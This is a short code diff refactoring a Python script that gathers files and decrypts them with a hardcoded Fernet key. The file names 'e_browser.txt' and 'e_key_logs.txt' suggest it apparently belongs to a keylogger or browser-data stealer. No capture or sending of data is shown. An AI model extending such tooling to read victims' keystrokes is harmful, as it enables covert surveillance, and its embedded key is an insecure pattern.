@@ -1,6 +1,8 @@
-import sys, os, re, pathlib
-from cryptography.fernet import Fernet
 import logging
+import os
+import re
+from cryptography.fernet import Fernet
+
 
 if __name__ == '__main__':
     try:
@@ -9,8 +11,8 @@ if __name__ == '__main__':
                             'e_browser.txt', 'e_key_logs.txt' ]
         regex = re.compile(r'.+\.xml$')
 
-        for dirpath, dirnames, filenames in os.walk(path):
-            [ encrypted_files.append(file) for file in filenames if regex.match(file) ]
+        for _, _, file_names in os.walk(path):
+            [encrypted_files.append(file) for file in file_names if regex.match(file)]
 
         key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='
 
